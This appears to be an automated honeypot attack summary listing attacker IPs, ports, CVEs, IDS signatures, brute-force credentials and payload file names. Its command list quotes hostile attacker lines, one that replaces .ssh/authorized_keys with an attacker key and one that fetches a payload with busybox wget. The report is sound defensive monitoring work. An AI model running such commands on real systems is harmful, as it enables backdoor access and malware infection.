**Honeypot Attack Summary Report**

**Report Generation Time:** 2025-10-27T14:01:52Z
**Timeframe:** 2025-10-27T13:00:01Z to 2025-10-27T13:40:01Z
**Files Used:**
- agg_log_20251027T130001Z.json
- agg_log_20251027T132001Z.json
- agg_log_20251027T134001Z.json

---

### **Executive Summary**

This report summarizes 14,554 malicious events recorded across the honeypot network. The primary activity observed was exploitation attempts, network scanning, and brute-force attacks. The `Suricata` honeypot recorded the highest number of events, indicating significant network-level attack traffic. The most prominent attacker IP was `198.23.190.58`. A high volume of traffic targeted port `5060` (SIP), suggesting widespread VOIP scanning. Several CVEs were triggered, with `CVE-2005-4050` being the most frequent. Attackers were observed attempting to download and execute malicious shell scripts and binaries.

---

### **Detailed Analysis**

**Attacks by Honeypot:**
- **Suricata:** 4,127
- **Honeytrap:** 2,950
- **Sentrypeer:** 2,637
- **Cowrie:** 2,553
- **Ciscoasa:** 1,894
- **Mailoney:** 96
- **Adbhoney:** 76
- **Dionaea:** 64
- **Redishoneypot:** 61
- **H0neytr4p:** 60
- **Dicompot:** 9
- **ssh-rsa:** 6
- **ConPot:** 6
- **Tanner:** 4
- **Honeyaml:** 4
- **ElasticPot:** 4
- **Heralding:** 3

**Top Attacking IPs:**
- **198.23.190.58:** 2,257
- **180.148.4.38:** 1,597
- **144.172.108.231:** 1,035
- **47.237.163.130:** 310
- **159.223.238.234:** 270
- **107.170.36.5:** 252
- **45.8.17.76:** 246
- **167.172.34.180:** 220
- **88.210.63.16:** 201
- **193.24.211.28:** 176
- **35.128.43.14:** 169
- **202.70.82.95:** 169
- **165.22.197.109:** 165
- **122.53.133.167:** 149
- **77.83.207.203:** 144
- **167.250.224.25:** 140
- **68.183.149.135:** 111
- **2.57.121.61:** 85
- **180.184.134.158:** 76
- **185.174.182.226:** 70

**Top Targeted Ports/Protocols:**
- **5060:** 2,637
- **TCP/445:** 1,594
- **UDP/5060:** 762
- **22:** 482
- **5038:** 246
- **TCP/5900:** 201
- **22222:** 166
- **2077:** 156
- **9635:** 133
- **5903:** 132
- **5901:** 120
- **TCP/22:** 87
- **25:** 96
- **5905:** 78
- **5904:** 77
- **27019:** 68
- **443:** 58
- **8333:** 58
- **4150:** 56
- **6379:** 50

**Most Common CVEs:**
- **CVE-2005-4050:** 750
- **CVE-2002-0013 CVE-2002-0012:** 3
- **CVE-2023-48022 CVE-2023-48022:** 1
- **CVE-2019-11500 CVE-2019-11500:** 1

**Commands Attempted by Attackers (Selection):**
- `cat /proc/uptime 2 > /dev/null | cut -d. -f1`
- `uname -s -v -n -m 2 > /dev/null`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >>.ssh/authorized_keys`
- `rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://...`
- `cat /proc/cpuinfo | grep name | wc -l`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `crontab -l`
- `uname -a`
- `whoami`

**Signatures Triggered (Top 10):**
- **ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication:** 1,590
- **2024766:** 1,590
- **ET VOIP MultiTech SIP UDP Overflow:** 750
- **2003237:** 750
- **ET SCAN MS Terminal Server Traffic on Non-standard Port:** 472
- **2023753:** 472
- **ET DROP Dshield Block Listed Source group 1:** 226
- **2402000:** 226
- **ET HUNTING RDP Authentication Bypass Attempt:** 188
- **2034857:** 188

**Users / Login Attempts (Selection):**
- root/is2burl4nd0
- root/isa02lwi4
- root/Isaias0608
- root/isatnet3kali
- root/isg102030
- root/iskaiwari
- admin/03121992
- jla/xurros22$
- systemd/Voidsetdownload.so
- wang/wang123

**Files Uploaded/Downloaded:**
- **wget.sh;**: 28
- **w.sh;**: 7
- **c.sh;**: 7
- **arm.uhavenobotsxd**: 4
- **arm5.uhavenobotsxd**: 4
- **arm6.uhavenobotsxd**: 4
- **arm7.uhavenobotsxd**: 4
- **x86_32.uhavenobotsxd**: 4
- **mips.uhavenobotsxd**: 4
- **mipsel.uhavenobotsxd**: 4

**HTTP User-Agents:**
- None observed.

**SSH Clients:**
- None observed.

**SSH Servers:**
- None observed.

**Top Attacker AS Organizations:**
- Data not available in logs.

---

### **Key Observations and Anomalies**

1.  **High Volume of SIP Scans:** The significant traffic on port 5060 (SIP) across a large number of IPs suggests a coordinated, large-scale scanning operation targeting VoIP infrastructure.
2.  **DoublePulsar Activity:** The most triggered Suricata signature relates to the DoublePulsar backdoor, indicating that systems are still being scanned for the vulnerability exploited by this tool.
3.  **Malware Delivery via Shell Commands:** Attackers frequently used `wget` and `curl` within shell commands to download and execute malware. The filenames (`w.sh`, `c.sh`, `uhavenobotsxd`) suggest automated infection scripts.
4.  **Credential Stuffing:** A wide variety of username/password combinations were attempted, with a strong focus on default or common credentials for `root` and `admin` accounts.
5.  **Information Gathering:** Multiple commands like `uname`, `cat /proc/cpuinfo`, and `free -m` show that attackers perform reconnaissance to tailor their exploits to the compromised system.
